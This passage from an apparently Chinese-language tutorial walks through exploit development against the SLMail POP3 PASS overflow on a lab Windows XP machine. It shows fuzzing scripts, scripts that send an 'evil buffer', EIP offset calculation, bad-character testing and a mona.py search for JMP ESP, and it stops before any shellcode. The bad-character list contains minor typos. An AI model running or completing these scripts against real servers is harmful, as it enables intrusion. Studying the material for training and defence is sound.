+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer=[<span class="string">&quot;A&quot;</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">&quot;A&quot;</span>*counter)</span><br><span class="line">    counter=counter+<span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> % <span class="built_in">len</span>(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&quot;PASS &quot;</span>+string+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    s.send(<span class="string">&quot;QUIT\r\n&quot;</span>)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203116758-220099230.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203149085-1636934061.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203200218-1673562821.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203210318-174706287.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127204307247-360998766.png" /></p>
+<p><strong>winxp_sp3状态：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127204415456-1345972743.png" /></p>
+<p><strong>由上图知 PASS 命令接收到大量数据时会溢出，EIP
+寄存器地址亦被覆盖。</strong></p>
+<h4 id="确定寻找覆盖eip地址的4-个字节">7.2 确定（寻找）覆盖EIP地址的4
+个字节</h4>
+<p><strong>（1）二分法</strong></p>
+<p><strong>示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># cat 03.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * **2600**</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((&quot;<span class="number">10.10</span>.<span class="number">10.131</span>&quot;,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line">except:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./03.py </span></span><br><span class="line"></span><br><span class="line">Sending evil buffer...</span><br><span class="line"></span><br><span class="line">Done!.</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127205955379-1541230790.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># cat 03.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * 2700</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((&quot;<span class="number">10.10</span>.<span class="number">10.131</span>&quot;,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line">except:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./03.py </span></span><br><span class="line"></span><br><span class="line">Sending evil buffer...</span><br><span class="line"></span><br><span class="line">Done!.</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127210424990-1905992355.png" /></p>
+<p><strong>推得EIP在2600~2700之间，不断用二分法即可得出EIP的精确位置！</strong></p>
+<p><strong>（2）唯一字串法</strong></p>
+<p><strong>生成唯一字符串</strong> （每 4 个字节都是不一样的）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 2700</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9</span><br></pre></td></tr></table></figure>
+<p><strong>将该唯一字符串赋给03.py的 buffer重新执行03.py</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127213117467-869099358.png" /></strong></p>
+<p><strong>EIP地址"39694438"对应的ASCII码应为38 44 69
+39，即"8Di9"</strong></p>
+<p><strong>计算偏移量</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 39694438 -l 2700</span></span><br><span class="line">[*] Exact match at offset 2606</span><br></pre></td></tr></table></figure>
+<p><strong>即覆盖EIP地址前面又2606个字节！</strong></p>
+<p><strong>验证(04.py):</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;C&#x27;</span>*<span class="number">20</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127213746337-485181364.png" /></p>
+<h4 id="攻击思路">7.3 攻击思路</h4>
+<p>• 将 EIP
+修改为shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP
+寄存器数值，将跳转到 shellcode 代码段并执行；</p>
+<p>• 寻找可存放shellcode的内存空间</p>
+<p>手动修改C数值，判断内存空间大小是否能放一下shellcode，假设ESP寄存器可放3500</p>
+<p><strong>05.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;C&#x27;</span>*(<span class="number">3500</span>-<span class="number">2606</span>+<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127214749207-334843509.png" /></p>
+<p><strong>存放"C"内存空间的起始地址为：0167A154，
+终止地址为：0167A2F4，0167A2F4-0167A154=1A0=416字节/字符。</strong></p>
+<p>即可存放shellcode的内存空间为416字节，最小的shellcode为300字节左右，因此ESP可以放下一个shellcode。</p>
+<h4 id="确定坏字符">7.4 确定坏字符</h4>
+<p><strong>•
+不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</strong></p>
+<p><strong>• 返回地址、 Shellcode、
+buffer中都不能出现坏字符</strong></p>
+<p><strong>• null byte (0x00)
+空字符，用于终止字符串的拷贝操作</strong></p>
+<p><strong>• return (0x0D) 回车操作，表示 POP3
+PASS命令输入完成</strong></p>
+<p><strong>• 思路：发送 0x00 ---- 0xff
+256个字符，查找所有坏字符</strong></p>
+<p><strong>06.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60&quot;</span></span><br><span class="line"><span class="string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2606</span> + <span class="string">&quot;B&quot;</span>*<span class="number">4</span> + badchars</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127220043281-977235106.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127220348244-799427020.png" /></p>
+<p>本应是0A但实际上是29，可得0A是坏字符，修改0A为某一正常字符（01~09）重新发送继续寻找坏字符。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127220837032-1806737049.png" /></p>
+<p>即0D也为坏字符不出现，并缩进了一格。同理可得00也被过滤，最终结果如下图：</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127221651176-633888469.png" /></p>
+<p><strong>综上，坏字符为：0x00 0x0D 0x0A</strong></p>
+<h4 id="重定向数据流">7.5 重定向数据流</h4>
+<p><strong>• 用 ESP 的地址替换 EIP 的值</strong></p>
+<p><strong>• 但是 ESP 地址变化，硬编码不可行</strong></p>
+<p><strong>• SLMail
+线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</strong></p>
+<p><strong>• 变通思路</strong></p>
+<p><strong>• 在内存中寻找地址固定的系统模块</strong></p>
+<p><strong>• 在模块中寻找 JMP ESP 指令的地址跳转，再由该指令间接跳转到
+ESP，从而执行shellcode</strong></p>
+<p><strong>• mona.py 脚本识别内存模块，搜索"return address"是JMP
+ESP指令的模块</strong></p>
+<p><strong>• 寻找无DEP、 ALSR保护的内存地址</strong></p>
+<p><strong>• 内存地址不包含坏字符</strong></p>
+<p><strong>• 寻找不受保护的系统模块</strong></p>
+<p><strong>• !mona modules</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127223416174-902353180.png" /></strong></p>
+<p><strong>Rebase：系统重启后模块地址是否发生变化；SafeSEH,ASLR,NXCompat都是保护机制，OS
+dll
+是否在所有系统都运行该模块。因此，选取原则为False，False，False，False，True。</strong></p>
+<p>• 在模块中搜索 <strong>jmp esp</strong>指令</p>
+<p><strong>• 由于内存中指令以二进制形式存储，所以需要将汇编指令 jmp esp
+转换为二进制</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit <span class="comment"># ./nasm_shell.rb </span></span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4              jmp esp</span><br></pre></td></tr></table></figure>
+<p><strong>• !mona find -s "" -m xxxx.dll</strong></p>
+<p><strong>• 选择不包含坏字符的内存地址</strong></p>
+<p><strong>演示：</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127225951423-612847760.png" /></strong></p>
+<p><strong>未找到，换下一模块！</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127230210030-1051993760.png" /></p>
+<p><strong>双击任意一个指令，在内存数据框中，右键选Disassemble切换为汇编语言显示：</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127230452455-1515380215.png" /></strong></p>
+<p>可去memory map中查看详细内容，基地址等。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127232617738-106088257.png" /></p>
+<p>因为SLmail本身不支持DEP和ASLR等内存保护机制，所以应该任意一个指令都可以实现跳转。如果有DEP保护，必须寻找到code行Access列中有R，E两个权限（绕过DEP）。</p>
